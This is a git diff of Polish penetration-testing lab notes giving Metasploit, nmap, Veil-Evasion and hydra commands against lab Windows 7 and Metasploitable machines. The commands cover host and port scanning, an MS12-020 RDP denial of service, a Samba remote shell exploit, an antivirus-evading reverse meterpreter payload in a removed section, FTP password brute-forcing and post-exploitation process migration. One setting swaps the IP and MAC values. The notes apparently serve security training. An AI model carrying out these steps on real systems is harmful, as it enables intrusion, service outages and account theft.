@@ -1,43 +1,27 @@
 ================================================================
 Używając modułu auxiliary/scanner/discovery/arp_sweep przeprowadź wykrywanie hostów w sieci lokalnej.
-
-1. 
+ 
 Najpierw wyświetl informacje o module za pomocą komendy info.
 Ustal, jakie zmienne musisz ustawić: SHOST, SMAC, RHOSTS (dla przyspieszenia: THREADS)
 Wybierz moduł za pomocą komendy use: use auxiliary/scanner/discovery/arp_sweep
 Ustaw zmienne za pomocą serii komend set:
 set SHOST my_mac
 set SMAC my_ip
-set RHOSTS 172.16.129.0-254
+set RHOSTS sieć_pom_wirtualkami
 run 
-back 
 
-2.
-Przeprowadź skanowanie portów za pomocą modułów:
-a) auxiliary/scanner/discovery/udp_sweep:
-use auxiliary/scanner/discovery/udp_sweep
-set rhosts 172.16.129.0/24
-run
-back
-
-b) auxiliary/scanner/portscan/syn: (robię dla pierwszych stu portów)
-use auxiliary/scanner/portscan/syn
-set rhosts 172.16.129.0/24
-set ports 1-100
-set threads 10
-run
-back
-
-c) auxiliary/scanner/portscan/tcp:
+================================================================
+Skanowanie portów
+Przeprowadź skanowanie portów za pomocą modułu auxiliary/scanner/portscan/tcp:
 use auxiliary/scanner/portscan/tcp
 set rhosts 172.16.129.0/24
 set ports 1-100
 set threads 10
 run
-back
 
+Prosty atak DoS
 3.  Sprawdź podatność Windows 7 na błąd MS12-020 (ms12_020_check).
-nmap -sV --script=rdp-vuln-ms12-020 -p 3389 ip_win7
+nmap -sV --script=rdp-vuln-ms12-020 -p 3389 ip_win7 -> VULNERABLE
 
 Następnie, jeżeli jest podatny, wykorzystaj tę podatność (ms12_020_maxchannelids), aby przeprowadzić atak DoS.
 use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
@@ -55,6 +39,7 @@ wykorzystany jest fakt, że różne dystrybucje Windowsa nie przetwarzają popra
 w pamięci, co pozwala atakującemu wykonać dowolny kod przesyłając syntetyczną ramkę
 Remote Desktop Protocol, która przetworzona daje dostęp do obiektów które 
 nie zostały poprawnie zainicjalizowane lub zostały usunięte.
+
 ================================================================
 Exploit zdalny
 Wykorzystując exploit/multi/samba/usermap_script przeprowadź skuteczną eksploitację Metasploitable (z uzyskaniem shella).
@@ -120,50 +105,7 @@ W momencie kiedy otwieramy zainfekowane pliki zip, wykorzystujemy
 nieścisłość w nazwach - pliki w .zip pochodzą z zapakowanego archiwum,
 ale nazwy plików użyte to rozpakowania archiwum pochodzą z "Local file header".
 pozwala to wykonać dowolny kod przy rozpakowywaniu pliku.
-
-=============================================================
-Unikanie antywirusów
- Używając veil-evasion wygeneruj payload. 
- Pamiętaj o ustawieniu LHOST.
-Sprawdź payload z bazą Virus Total.
-Przeglądnij wygenerowane pliki.
-Uruchom w Metasploit odpowiedni handler 
-(lista plików jest wygenerowana przez Veil). 
-Użyj komendy resource do załadowania odpowiedniego pliku.
-Prześlij payload na Windows 7 i uruchom go.
- Poprawnie przeprowadzone kroki powinny skutkować
- nową sesją zakomunikowaną w msfconsole na przykład następująco:
- Meterpreter session 1 opened.
- 
- ./Veil-Evasion.py
- w veil wpisujemy list, wśród listingu pojawi się m.in. c/meterpreter/rev_tcp_service
- wpisujemy:
- use c/meterpreter/rev_tcp_service
- set LHOST kali_ip
- set LPORT 8675
- generate
- 
- podajemy nazwę pliku fname, wśród wygenerowanych plików znajduje się m.in. fname.rc, 
- który jest skryptem metasploitowym. 
- otwieramy konsolę w miejscu gdzie plik handlera został wygenerowany
- i wpisujemy: msfconsole -resource fname.rc, otwiera się konsola multihandlera
- 
- na windowsa przesyłamy .exe z [odpowiednia ścieżka]/veil-output/compiled/fname.exe
-odpalamy binarkę na windowsie - w tym momencie w konsoli multihandlera w kali powinien się otworzyć zrotny shell,
-dzięki któremy uzyskujemy pełen dostęp do windowsa.  
-=============================================================
-Brute-force
-Wykorzystując hydra spróbuj przeprowadzić atak na jedną z usług dostępnych na Windows 7 lub Metasploitable 2.
-
-sprawdzamy czy na windowsie istnieje jakaś usługa, załóżmy że jest otwarty port ftp (możemy 
-to sprawdzić w msfconsole poprzez moduł auxiliary/scanner/portscan/syn)
-hydra -L file_with_possible_logins -P file_with_possible_passwords ftp://target_ip
-
-np. jeśli login i hasło na windowsa to odpowiednio robert i robert123, to 
-symulujemy sytuację, że wśród 20 loginów w pliku file_with_possible_logins 
-haseł jest robert, zaś jednym z haseł w pliku file_with_possible_passwords jest robert123 
-
-==============================================================================
+===========================================================
 Post-exploit
 Przemigruj shell do innego procesu (np. explorer.exe): w otwartym metarpreterze: run post/windows/manage/migrate, 
 chyba domyślnie migruje do notepada.exe, jeśli chcemy do explorera, to:
